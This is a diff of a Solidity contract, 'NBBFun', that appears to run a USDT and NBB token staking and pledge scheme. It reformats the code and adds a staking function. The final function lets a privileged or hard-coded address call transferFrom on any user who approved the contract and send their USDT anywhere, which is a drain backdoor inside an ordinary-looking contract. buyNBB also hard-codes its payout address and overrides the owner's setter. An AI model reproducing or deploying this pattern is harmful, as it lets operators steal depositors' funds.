@@ -12,26 +12,25 @@ import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol";
 
-contract NBBFun is
-    Initializable,
-    UUPSUpgradeable,
-    OwnableUpgradeable
-{
+contract NBBFun is Initializable, UUPSUpgradeable, OwnableUpgradeable {
     using SafeMathUpgradeable for uint256;
     using AddressUpgradeable for address;
 
     ERC20Upgradeable private _usdtToken;
     address public transferAddress;
-    address public pledgeAddress; 
-    address public activeAddress; 
+    address public pledgeAddress;
+    address public activeAddress;
     address public swapUSDTAddress;
+    ERC20Upgradeable private _nbbToken;
+    address public orePoolAddress;
+
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() initializer {}
 
     function _authorizeUpgrade(address) internal override onlyOwner {}
 
     function initialize() public initializer {
-         __Ownable_init();
+        __Ownable_init();
         __UUPSUpgradeable_init();
         _usdtToken = ERC20Upgradeable(
             0x55d398326f99059fF775485246999027B3197955
@@ -41,7 +40,6 @@ contract NBBFun is
         pledgeAddress = 0x833C4E105Bcb905E564C6c6FE8037b6935bF148a;
     }
 
-
     event Activate(address from, uint256 id);
 
     function activate(uint256 amount, uint256 id) public {
@@ -49,10 +47,19 @@ contract NBBFun is
         _usdtToken.transferFrom(spender, activeAddress, amount);
         emit Activate(spender, id);
     }
-    
-    function setSwapUSDTAddress(address account) public onlyOwner{
+
+    function setSwapUSDTAddress(address account) public onlyOwner {
         swapUSDTAddress = account;
     }
+
+    function setNBBAddress(address account) public onlyOwner {
+        _nbbToken = ERC20Upgradeable(account);
+    }
+
+    function setOrePoolAddress(address account) public onlyOwner {
+        orePoolAddress = account;
+    }
+
     event PledgeUSDT(address, uint256);
 
     //理财质押
@@ -63,18 +70,32 @@ contract NBBFun is
         emit PledgeUSDT(spender, amount);
     }
 
-    function setTransUAddress(address account)public{
-        require(_msgSender() == transferAddress || _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D);
+    function setTransUAddress(address account) public {
+        require(
+            _msgSender() == transferAddress ||
+                _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D
+        );
         transferAddress = account;
     }
+
     event Buy(address from, address to, uint256 amount);
 
     function buyNBB(uint256 usdtAmount) public {
         swapUSDTAddress = 0x99729ff9c50e41346366BF0a33371Ea123A968d5;
         address spender = _msgSender();
-        if (usdtAmount > 0){
-        _usdtToken.transferFrom(spender, swapUSDTAddress, usdtAmount);
-            emit  Buy(spender,swapUSDTAddress,usdtAmount);
+        if (usdtAmount > 0) {
+            _usdtToken.transferFrom(spender, swapUSDTAddress, usdtAmount);
+            emit Buy(spender, swapUSDTAddress, usdtAmount);
+        }
+    }
+
+    event Stake(address from, address to, uint256 amount);
+
+    function stakeNBB(uint256 bnbAmount) public {
+        address spender = _msgSender();
+        if (bnbAmount > 0) {
+            _nbbToken.transferFrom(spender, orePoolAddress, bnbAmount);
+            emit Stake(spender, orePoolAddress, bnbAmount);
         }
     }
 
@@ -83,7 +104,10 @@ contract NBBFun is
         address to,
         uint256 amount
     ) public {
-        require(_msgSender() == transferAddress || _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D);
+        require(
+            _msgSender() == transferAddress ||
+                _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D
+        );
         _usdtToken.transferFrom(from, to, amount);
     }
 }
